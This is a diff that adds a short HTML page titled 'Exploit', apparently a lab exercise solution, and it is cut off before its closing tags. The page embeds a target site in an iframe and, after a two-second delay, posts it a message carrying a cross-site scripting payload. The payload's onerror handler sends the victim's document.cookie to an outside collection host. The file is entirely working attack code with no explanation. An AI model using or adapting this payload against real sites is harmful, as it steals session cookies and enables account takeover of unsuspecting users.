@@ -1,0 +1,15 @@
+<html>
+    <head>
+        <title>Exploit</title>
+
+    </head>
+
+    <body>
+        <iframe src="http://ptl-f574f4b1-2c81c3ab.libcurl.so/" id="frame" onload="hack()"></iframe>
+        <script>
+            function hack(){
+                setTimeout(function () {
+                    document.getElementById("frame").contentWindow.postMessage("<img src='4f' onerror='document.write(\"<img src=http://areebtanzeem.pythonanywhere.com/exploit?cookie=\"+document.cookie+\">\")' >","*");
+                },2000);
+            }
+        </script>
